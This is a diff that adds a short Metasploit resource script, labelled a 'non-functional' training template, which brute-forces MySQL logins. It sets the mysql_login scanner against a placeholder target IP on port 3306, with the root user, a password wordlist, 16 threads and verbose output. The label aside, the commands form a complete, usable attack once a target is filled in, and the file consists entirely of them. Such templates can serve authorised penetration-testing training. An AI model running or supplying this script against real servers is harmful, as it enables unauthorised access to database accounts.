@@ -1,0 +1,11 @@
+# MySQL Brute Force Template
+# For Training Use – Non-functional Template
+
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS <TARGET_IP>
+set RPORT 3306
+set USERNAME root
+set PASS_FILE /usr/share/wordlists/mysql_passwords.txt
+set THREADS 16
+set VERBOSE true
+run
